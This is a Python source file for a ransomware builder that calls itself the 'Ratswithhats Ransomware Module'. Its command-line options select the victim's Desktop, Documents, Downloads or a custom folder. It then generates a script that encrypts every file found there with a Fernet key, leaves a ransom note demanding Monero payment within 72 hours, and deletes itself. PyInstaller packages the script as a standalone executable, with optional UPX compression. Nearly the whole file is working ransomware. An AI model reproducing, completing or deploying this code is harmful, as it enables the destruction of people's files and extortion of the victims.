import os
import sys
from sys import platform
import glob
from cryptography.fernet import Fernet
import argparse

full_path = os.path.realpath(__file__) # our full path
path, filename = os.path.split(full_path) # our path & filename, separated
#annihilatordir = path + r"/Annihilator"
#upxdir = annihilatordir + r"/UPX" 

dumbline = "-" * 100

banner = (r"""                                     
  ____       _                _ _   _     _           _       
 |  _ \ __ _| |_ _____      _(_) |_| |__ | |__   __ _| |_ ___ 
 | |_) / _` | __/ __\ \ /\ / / | __| '_ \| '_ \ / _` | __/ __|      Ransomware
 |  _ < (_| | |_\__ \\ V  V /| | |_| | | | | | | (_| | |_\__ \      Module
 |_| \_\__,_|\__|___/ \_/\_/ |_|\__|_| |_|_| |_|\__,_|\__|___/
                                                              
""")

if platform == "darwin":
    os.system("clear")
elif platform == "win32":
    os.system("cls")

print(banner)

parser = argparse.ArgumentParser()
parser.add_argument("--name", help="Name for .exe")
parser.add_argument("--output", help="path/to/save/output - if not given, file builds to current directory")
parser.add_argument("--desk", help="Target desktop files", action="store_true")
parser.add_argument("--doc", help="Target document files", action="store_true")
parser.add_argument("--down", help="Target download files", action="store_true")
parser.add_argument("--dir", help="Target a specific directory - must have correct path (MUST use {hostname} for user profile)", action="store_true")
parser.add_argument("--encrypt", help="The built file encrypts files specified in the paths selected above - cannot be used with the decrypt argument", action="store_true")
parser.add_argument("--decrypt", help="The built file decrypts files specified in the paths select above - cannot be used with the encrypt argument", action="store_true")
parser.add_argument("--compress", help="Compress final payload using UPX", action="store_true")

args = parser.parse_args()

if args.name:
    named = args.name

if args.output:
    if os.path.isdir(args.output):
        outputpath = args.output
        if os.path.isdir(outputpath):
            pass
        else:
            os.mkdir(outputpath)
    else:
        print(dumbline)
        print("\nOPTION: Path given does not exist. Make sure path is correct in --path argument")
        print(f"Path given: {args.output}")
        check = input(f"\nDo you want to build to current directory ({os.getcwd()}) instead. (Y)es or (N)o: ")
        if check == "Y":
            outputpath = os.getcwd() + r"/build"
            if os.path.isdir(outputpath):
                pass
            else:
                os.mkdir(outputpath)
        else:
            sys.exit(f"\nProgram ended - No path was given. Use -h for usage \n\n{dumbline}")

if not args.output:
    print(dumbline)
    print(f"No path was given, current directory ({os.getcwd()}) is used to build instead ")
    outputpath = os.getcwd() + "/build"
    if os.path.isdir(outputpath):
        pass
    else:
        os.mkdir(outputpath)

payload = (r"""
import os
import sys

def resource_path(relative_path):
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

def print_file(file_path):
    file_path = resource_path(file_path)
    with open(file_path) as fp:
        for line in fp:
            key = line
            return key

""")

if args.desk:

    payload += (r"""
import glob

docfiles = []

path = os.getcwd()
splitpath = path.split("/")
splitpath.remove("")
hostname = splitpath[1]

for filename in glob.iglob(f"Users/{hostname}/Desktop" + '**/**', recursive=True):
    if os.path.isfile(filename):

        docfiles.append(filename)

    """)

if args.doc:
    if args.desk:
        payload += (r"""

for filename in glob.iglob(f"Users/{hostname}/Documents" + '**/**', recursive=True):
    if os.path.isfile(filename):

        docfiles.append(filename)

        """)
    else:
        payload += (r"""
import glob

docfiles = []

path = os.getcwd()
splitpath = path.split("/")
splitpath.remove("")
hostname = splitpath[1]

for filename in glob.iglob(f"Users/{hostname}/Documents" + '**/**', recursive=True):
    if os.path.isfile(filename):

        docfiles.append(filename)

        """)

if args.down:
    if args.desk or args.doc:
        payload += (r"""

for filename in glob.iglob(f"Users/{hostname}/Downloads" + '**/**', recursive=True):
    if os.path.isfile(filename):

        docfiles.append(filename)

        """)
    else:
        payload += (r"""
import glob

docfiles = []

path = os.getcwd()
splitpath = path.split("/")
splitpath.remove("")
hostname = splitpath[1]

for filename in glob.iglob(f"Users/{hostname}/Downloads" + '**/**', recursive=True):
    if os.path.isfile(filename):

        docfiles.append(filename)

        """)

if args.dir:

    pathedoption = input(str("\nWhat is the target path (use {hostname} for userprofile): "))

    pathedinfo = pathedoption.split("/")
    pathedinfo.remove("")
    checked = pathedinfo[1]

    hostname = "{hostname}"

    if checked == "{hostname}":
        pass
    else:
        sys.exit(f"\nProgram ended - Target path did not include {hostname} for userprofile in --dir argument. Use -h for usage \n\n{dumbline}")

    with open(outputpath + "/path.txt", mode = "wt", encoding = "utf-8") as myfile:
        myfile.writelines(pathedoption)
        
    print(f"\nTarget path to encrypt is: {pathedoption} \npath.txt Saved to {outputpath}")

    if args.doc or args.desk or args.down:
        pass
    else:
        payload += (r"""
path = os.getcwd()
splitpath = path.split("/")
splitpath.remove("")
hostname = splitpath[1]

        """)

    payload += (r"""
import glob

docfiles = []

pathfordir = print_file("path.txt")
pathfordir = pathfordir.split("/")
pathfordir.remove("")
checking = pathfordir[1]

if checking == "{hostname}":
    pathfordir[1] = hostname

pathfordir = "/".join(pathfordir)
pathfordir = "/" + pathfordir

for filename in glob.iglob(pathfordir + '**/**', recursive=True):
    if os.path.isfile(filename):

        docfiles.append(filename)
    
        """)

if args.encrypt:

    if args.decrypt:
        sys.exit(f"\nProgram ended - decryption cannot be used with --encrypt argument. Use -h for usage \n\n{dumbline}")
 
    if args.desk or args.doc or args.down or args.dir:

        key = Fernet.generate_key()
        forfile = key.decode("utf-8")


        with open(outputpath + "/key.txt", mode = "wt", encoding = "utf-8") as myfile:
            myfile.writelines(forfile)

        print(f"\nEncryption key is: {forfile} \nkey.txt Saved to {outputpath}")

        payload += (r"""

from cryptography.fernet import Fernet

key = print_file("key.txt")

for file in docfiles:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
    print(f"{file} encrypted.")


os.chdir(f"/Users/{hostname}/Desktop")

maker = os.path.exists("Clown")

if not maker:
    os.mkdir("Clown")

os.chdir(f"/Users/{hostname}/Desktop/Clown")

with open("OHNO.txt", mode = 'wt', encoding = 'utf-8') as myfile:
    myfile.write("Oops. your important files are encrypted.\n\n")
    myfile.write("If you see this text, then your files are no longer accessible - because they have been encrypted.\n\n")  
    myfile.write("You can verify this by clicking on the files and try opening them. Perhaps you are busy looking for a way to recover your files, but don't waste your time. Nobody can recover your files without our decryption service.\n\n")
    myfile.write("We guarantee that you can recover all your files safely and easily. All you need to do is submit the payment and purchase the decryption key.\n\n")
    myfile.write("Payment is needed within 72 hours otherwise your files are permanently lost :) \n\n")
    myfile.write("Please follow the instructions: \n\n")
    myfile.write("1.    Send $10 worth of Monero to following address: \n\n")
    myfile.write("TO BE DONE\n\n")
    myfile.write("2.    Send your Monero wallet ID and proof of purchase to e-mail example123@example.com\n\n")
    myfile.write("3.    Wait for a response back.")

os.remove(sys.argv[0])

        """)

    else:
        sys.exit(f"\nProgram ended - encryption cannot be used without --desk, --doc, --down. Use -h for usage \n\n{dumbline}")

if args.decrypt:

    if args.encrypt:
        sys.exit(f"\nProgram ended - decryption cannot be used with --encrypt argument. Use -h for usage \n\n{dumbline}")

    if args.desk or args.doc or args.down or args.dir:

        key = input(str("\nWhat is the encryption key: "))

        with open(outputpath + "/key.txt", mode = "wt", encoding = "utf-8") as myfile:
            myfile.writelines(key)
        
        print(f"\nEncryption key is: {key} \nSaved to {outputpath}")

        payload += (r"""
from cryptography.fernet import Fernet

key = print_file("key.txt")

for file in docfiles:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_decrypted = Fernet(key).decrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_decrypted)
    print(f"{file} decrypted.")

os.remove(sys.argv[0])

        """)
    else:
        sys.exit(f"\nProgram ended - decryption cannot be used without --desk, --doc, --down. Use -h for usage \n\n{dumbline}")


if args.desk or args.doc or args.down or args.dir:

    with open(outputpath + "/final.py", mode='wt', encoding='utf-8') as myfile:
        myfile.writelines(payload)

    print(f"\nProgram built to {outputpath}")
    print(f"\n{dumbline}")

if (args.desk or args.doc or args.down or args.dir) and (args.encrypt or args.decrypt):

    builtpathlocationpy = outputpath + "/final.py"
    builtpathlocationtxt = outputpath + "/key.txt"
    builtpathlocationpath = outputpath + "/path.txt"

    print(f"\nBuilding file --> {builtpathlocationpy}")
    print(f"Attaching .txt key file --> {builtpathlocationtxt}")
    print(f"Attaching .txt path file --> {builtpathlocationpath}\n")

    os.system(fr"""pyinstaller --onefile --add-data={builtpathlocationtxt}:. --add-data={builtpathlocationpath}:. {builtpathlocationpy}""")

    sys.exit(f"\nThe program has finished and built to the dist file in {outputpath}. Use -h for usage\n{dumbline}")

